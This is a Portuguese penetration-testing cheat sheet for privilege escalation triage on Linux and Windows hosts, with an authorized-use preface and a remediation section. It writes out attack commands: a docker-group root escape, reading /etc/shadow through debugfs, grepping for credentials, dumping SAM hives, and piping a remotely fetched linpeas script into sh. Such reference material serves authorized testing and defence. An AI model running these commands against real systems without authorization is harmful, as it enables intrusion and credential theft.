# Privilege Escalation — Quick Wins & Triagem (Linux + Windows)

> Cartão de triagem rápida: os primeiros 5 minutos em qualquer host comprometido, com os vetores de maior probabilidade e como validar antes de explorar. Complementa os checklists detalhados de Linux e Windows.

## Uso autorizado e responsável

Somente em escopo autorizado. Antes de explorar um vetor: (1) confirme manualmente a condição, (2) avalie o risco de impacto (crash, perda de dados), (3) registre evidência (comando + saída + timestamp) para o relatório. Exploits de kernel/driver só com aprovação explícita devido ao risco de instabilidade.

---

## Fluxo de decisão (ordem recomendada)

1. **Enumerar contexto** (quem sou, grupos, privilégios).
2. **Quick wins de baixo risco** (sudo -l, SUID, tokens, serviços com ACL fraca).
3. **Misconfigs** (cron/scheduled tasks, PATH, unquoted, AlwaysInstallElevated).
4. **Credenciais reutilizáveis** (history, configs, hives).
5. **Kernel/CVE** apenas se 1–4 falharem e houver autorização.

---

## Linux — top quick wins

| Vetor | Comando de checagem | Sinal de vitória |
|---|---|---|
| sudo NOPASSWD/GTFOBins | `sudo -l` | binário escapável listado |
| SUID exploitável | `find / -perm -4000 -type f 2>/dev/null` | binário em GTFOBins |
| Capabilities | `getcap -r / 2>/dev/null` | `cap_setuid` em intérprete |
| Grupo docker/lxd | `id` | pertence ao grupo |
| Cron gravável | `cat /etc/crontab; ls -la /etc/cron.d/` | script root world-writable |
| Credenciais | `grep -RiE 'password|secret' /etc /var/www 2>/dev/null` | segredo válido |

```bash
# One-liner de triagem:
id; sudo -l 2>/dev/null; getcap -r / 2>/dev/null; \
find / -perm -4000 -type f 2>/dev/null; uname -a
# docker group → root imediato:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Windows — top quick wins

| Vetor | Comando de checagem | Sinal de vitória |
|---|---|---|
| SeImpersonate (Potato) | `whoami /priv` | privilégio Enabled |
| Serviço ACL fraca | `accesschk.exe -uwcqv %USERNAME% *` | SERVICE_CHANGE_CONFIG |
| Unquoted path | `wmic service get name,pathname,startmode \| findstr /i /v "\""` | espaço + dir gravável |
| AlwaysInstallElevated | `reg query HKLM\...\Installer /v AlwaysInstallElevated` | ambas = 0x1 |
| Binário gravável | `icacls "C:\Path\service.exe"` | (F)/(M) p/ usuário |
| Credenciais | `cmdkey /list`; `findstr /si password *.xml *.config` | segredo válido |

```cmd
:: Triagem rápida Windows:
whoami /all
whoami /priv
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
accesschk.exe -accepteula -uwcqv %USERNAME% * 2>nul
```

---

## Mapa de privilégios Windows → técnica

- `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` → PrintSpoofer / GodPotato / JuicyPotatoNG
- `SeBackupPrivilege` → `reg save HKLM\SAM`/`SYSTEM` → secretsdump
- `SeRestorePrivilege` → sobrescrever binário/arquivo protegido
- `SeDebugPrivilege` → injeção em processo SYSTEM
- `SeTakeOwnershipPrivilege` → assumir posse + reescrever ACL
- `SeLoadDriverPrivilege` → carregar driver vulnerável (BYOVD)

## Grupos Linux → técnica

- `sudo`/`wheel` → `sudo -l` + GTFOBins
- `docker`/`lxd` → montar `/` em container → chroot
- `disk` → ler `/dev/sda` (debugfs) → extrair `/etc/shadow`
- `adm` → ler logs com segredos
- `shadow` → ler hashes diretamente

```bash
# grupo disk:
debugfs /dev/sda1 -R "cat /etc/shadow"
```

---

## Automação (one-shot)

```bash
# Linux:
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
```cmd
:: Windows (transferir e rodar):
winPEASx64.exe quiet cmd fast
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
```

---

## Princípios de remediação (resumo defensivo)

- **Menor privilégio**: contas de serviço sem `SeImpersonate`/sudo ALL; remova grupos perigosos (docker/lxd) de usuários comuns.
- **Permissões corretas**: sem world-writable em binários/scripts/serviços executados como root/SYSTEM; cite caminhos entre aspas; PATH sem `.` ou dirs graváveis.
- **Higiene de credenciais**: LAPS no Windows; remova segredos de scripts/unattended/history; rotacione o que vazou.
- **Patch management**: kernel, glibc, polkit, sudo, Windows Update e hotfixes em dia.
- **Hardening**: desabilite `AlwaysInstallElevated`; `nosuid` em mounts de dados; remova SUID desnecessário; desabilite Spooler onde não usado.
- **Detecção**: EDR/auditd; alerta em `reg save SAM`, criação de SUID, reconfiguração de serviços, uso de pkexec/Potato.

---

## Referências

- GTFOBins — https://gtfobins.github.io
- LOLBAS — https://lolbas-project.github.io
- PEASS-ng — https://github.com/peass-ng/PEASS-ng
- HackTricks — Linux/Windows Privilege Escalation
